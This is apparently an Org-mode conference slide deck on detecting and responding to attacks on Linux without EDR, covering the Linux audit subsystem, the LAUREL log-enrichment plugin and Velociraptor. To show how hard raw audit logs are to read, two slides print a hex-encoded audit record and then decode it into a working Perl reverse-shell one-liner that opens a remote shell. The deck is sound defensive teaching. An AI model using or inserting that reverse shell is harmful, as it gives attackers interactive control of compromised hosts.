#+TITLE: Detection and Response for Linux without EDR
#+AUTHOR: Hilko Bengen
#+DATE: 2024-10-25
# bengen@hilluzination.de / https://github.com/hillu / @hillu@infosec.exchange

# -> intro

* System Logs

# -> detection basics

- e.g. =/var/log/messages=, =/var/log/auth.log=
- Easy to collect
- The usual suspects: =sudo=, =ssh=, =cron=, etc.
- Need context to detect anything
- Not sufficient for catching attackers

* Beyond syslog

- Detect unusual, suspicious behavior, e.g.:
  - Webshells
  - Reverse shells
  - Reconnaissance
  - "fileless" implants injected into processes
  - BPF seems interesing for attackers
- Need better telemetry!
  - Program executions
  - File watches
  - Special case syscalls

* Linux Audit Subsystem

# -> better telemetry

- Good for logging:
  - Program execution
  - File operations
  - Syscalls
  - SELinux, AppArmor events

- Stable, boring technology!
  - In kernel since mid-2000s
  - Basic format is well documented
  - Semantics are well understood

* Linux Audit Subsystem

# Image

#+ATTR_HTML: :height 600px :align center
[[file:audit.svg]]



* Linux Audit Subsystem, LOL

# -> linux audit problem

# type=SYSCALL msg=audit(1626611363.720:348501): arch=c000003e syscall=59 success=yes exit=0 a0=55c094deb5c0 a1=55c094dea770 a2=55c094dbf1b0 a3=fffffffffffff286 items=3 ppid=722076 pid=724395 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=3 comm="perl" exe="/usr/bin/perl" subj==unconfined key=(null)ARCH=x86_64 SYSCALL=execve AUID="user" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"

#+begin_src sh
type=SYSCALL msg=audit(1626611363.720:348501): …
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl"
  a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24
  703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545
  245414D2C67657470726F746F62796E616D6528227463702229293B69662863
  6F6E6E65637428532C736F636B616464725F696E2824702C696E65745F61746
  F6E282469292929297B6F70656E28535444494E2C223E265322293B6F70656E
  285354444F55542C223E265322293B6F70656E285354444552522C223E26532
  2293B6578656328222F62696E2F7368202D6922293B7D3B
type=CWD msg=audit(1626611363.720:348501): …
#+end_src

# type=CWD msg=audit(1626611363.720:348501): cwd="/root"
# type=PATH msg=audit(1626611363.720:348501): item=0 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
# type=PATH msg=audit(1626611363.720:348501): item=1 name="/usr/bin/perl" inode=401923 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
# type=PATH msg=audit(1626611363.720:348501): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=404797 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
# type=PROCTITLE msg=audit(1626611363.720:348501): proctitle=7065726C002D650075736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B657428532C50465F494E45542C534F434B5F53545245414D2C67657470726F746F62796E616D6528227463702229293B696628636F6E6E65637428532C736F636B616464725F696E2824702C696E65745F6174

- Parsing is hard for SIEM software
- Few filtering options

* Linux Audit Subsystem, LOL

So, what is this =EXECVE.a2=?
#+begin_src perl
use Socket; $i="10.0.0.1"; $p=1234;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if (connect(S, sockaddr_in($p, inet_aton($i)))) {
open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");
exec("/bin/sh -i"); };
#+end_src

* Our solution

#+ATTR_HTML: :height 150px :align center
[[file:laurel.svg]]

"Linux Audit – Usable, Robust, Easy Logging"
- /auditd/ plugin: Parse audit log, write JSON
- Enrichment, process tracking and labelling
- Filtering capabilities
- https://github.com/threathunters-io/laurel, GPLv3

# -> detect summary

* Our solution

# Image

#+ATTR_HTML: :height 600px :align center
[[file:audit-laurel.svg]]

* EDR? On Linux? Interesting.

- "Our work so far has been basic, common sense"
- "Let's see if we can do better with an off-the-shelf product"

* Made for Windows.

# -> Made for Windows

- "=CreateProcess=. What is =fork=, =exec=?"
- "=root= = 'S-1-5-18'. Everybody knows that"
- "What's a numeric user ID?"
- "What are groups?"
- "Filenames are all valid Unicode. Right?"

* Response and Hunting

# -> Response

- Get context for alerts
- simple tasks
  - inspect files
  - =ps=
  - =netstat=
- Use YARA rules to hunt for specific files
- Find process anomalies

* Velociraptor

#+ATTR_HTML: :height 150px :align center
[[file:velo.svg]]
- "digital forensic and incident response tool"
- /Velociraptor Query Language/
- Some assembly required
- Excellent support
- https://docs.velociraptor.app, AGPLv3

* Support infrastructure

- Diagnosis scripts to check for misconfiguration
  - Simplify support cases
- RPM+DEB packages
  - Reduce mistakes made in installation

* Contact info

#+ATTR_HTML: :height 120px
[[file:avatar.jpg]]

Hilko Bengen <bengen@hilluzination.de>
| https://github.com/hillu | @hillu@infosec.exchange |

Slides are available online:
#+ATTR_HTML: :height 150px
[[file:talk-url.png]]


